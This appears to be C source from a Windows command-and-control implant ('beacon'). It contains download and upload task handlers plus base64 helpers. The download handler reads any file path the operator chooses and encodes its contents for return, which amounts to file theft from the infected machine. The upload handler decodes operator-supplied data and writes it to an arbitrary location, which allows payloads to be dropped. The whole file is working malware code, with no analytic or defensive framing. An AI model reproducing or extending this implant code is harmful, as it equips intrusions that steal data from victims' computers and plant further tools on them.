#include <beacon.h>
#include <stdio.h>
#include <string.h>

static const char B64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static DWORD b64_encode(const BYTE *src, DWORD src_len, char *dst, DWORD dst_sz) {
    DWORD i = 0, o = 0;
    while (i < src_len) {
        DWORD remaining = src_len - i;
        BYTE b0 = src[i];
        BYTE b1 = remaining > 1 ? src[i + 1] : 0;
        BYTE b2 = remaining > 2 ? src[i + 2] : 0;

        if (o + 4 >= dst_sz) break;
        dst[o++] = B64_CHARS[b0 >> 2];
        dst[o++] = B64_CHARS[((b0 & 0x03) << 4) | (b1 >> 4)];
        dst[o++] = remaining > 1 ? B64_CHARS[((b1 & 0x0F) << 2) | (b2 >> 6)] : '=';
        dst[o++] = remaining > 2 ? B64_CHARS[b2 & 0x3F] : '=';
        i += 3;
    }
    dst[o] = '\0';
    return o;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *src, int src_len, BYTE *dst, int dst_sz) {
    int o = 0;
    for (int i = 0; i + 3 < src_len; i += 4) {
        int v0 = b64_val(src[i]);
        int v1 = b64_val(src[i + 1]);
        int v2 = src[i + 2] == '=' ? 0 : b64_val(src[i + 2]);
        int v3 = src[i + 3] == '=' ? 0 : b64_val(src[i + 3]);
        if (v0 < 0 || v1 < 0) return -1;
        if (o >= dst_sz) return -1;
        dst[o++] = (BYTE)((v0 << 2) | (v1 >> 4));
        if (src[i + 2] != '=' && o < dst_sz)
            dst[o++] = (BYTE)((v1 << 4) | (v2 >> 2));
        if (src[i + 3] != '=' && o < dst_sz)
            dst[o++] = (BYTE)((v2 << 2) | v3);
    }
    return o;
}

void beacon_exec_download(PARSED_TASK *task, TASK_RESULT *result) {
    if (!task->args) {
        snprintf(result->error, sizeof(result->error), "no path specified");
        return;
    }

    HANDLE hFile = CreateFileA(task->args, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(result->error, sizeof(result->error),
                 "cannot open file: %lu", GetLastError());
        return;
    }

    LARGE_INTEGER fsize;
    if (!GetFileSizeEx(hFile, &fsize) || fsize.QuadPart == 0) {
        CloseHandle(hFile);
        snprintf(result->error, sizeof(result->error), "empty or unreadable file");
        return;
    }
    if (fsize.QuadPart > (LONGLONG)0xFFFFFFFF) {
        CloseHandle(hFile);
        snprintf(result->error, sizeof(result->error), "file too large (>4 GB)");
        return;
    }

    DWORD raw_sz = (DWORD)fsize.QuadPart;

    DWORD b64_needed = ((raw_sz + 2) / 3) * 4 + 4;
    if (b64_needed > result->output_cap) {
        char *tmp = (char *)HeapReAlloc(GetProcessHeap(), 0, result->output, b64_needed);
        if (!tmp) {
            CloseHandle(hFile);
            snprintf(result->error, sizeof(result->error), "out of memory");
            return;
        }
        result->output     = tmp;
        result->output_cap = b64_needed;
    }

    BYTE *raw = (BYTE *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)raw_sz);
    if (!raw) {
        CloseHandle(hFile);
        snprintf(result->error, sizeof(result->error), "out of memory");
        return;
    }

    DWORD nread = 0;
    if (!ReadFile(hFile, raw, raw_sz, &nread, NULL) || nread != raw_sz) {
        HeapFree(GetProcessHeap(), 0, raw);
        CloseHandle(hFile);
        snprintf(result->error, sizeof(result->error),
                 "read failed: %lu", GetLastError());
        return;
    }
    CloseHandle(hFile);

    result->output_len = b64_encode(raw, nread, result->output, result->output_cap);
    HeapFree(GetProcessHeap(), 0, raw);
}

void beacon_exec_upload(PARSED_TASK *task, TASK_RESULT *result) {
    if (!task->args) {
        snprintf(result->error, sizeof(result->error), "no destination path");
        return;
    }
    if (!task->data || task->data_len <= 0) {
        snprintf(result->error, sizeof(result->error), "no data payload");
        return;
    }

    int dec_cap = (task->data_len / 4) * 3 + 4;
    BYTE *decoded = (BYTE *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)dec_cap);
    if (!decoded) {
        snprintf(result->error, sizeof(result->error), "out of memory");
        return;
    }

    int dec_len = b64_decode(task->data, task->data_len, decoded, dec_cap);
    if (dec_len < 0) {
        HeapFree(GetProcessHeap(), 0, decoded);
        snprintf(result->error, sizeof(result->error), "base64 decode failed");
        return;
    }

    HANDLE hFile = CreateFileA(task->args, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, decoded);
        snprintf(result->error, sizeof(result->error),
                 "cannot create file: %lu", GetLastError());
        return;
    }

    DWORD written = 0;
    WriteFile(hFile, decoded, (DWORD)dec_len, &written, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, decoded);

    result->output_len = (DWORD)snprintf(result->output, result->output_cap,
        "uploaded %d bytes -> %s", dec_len, task->args);
}
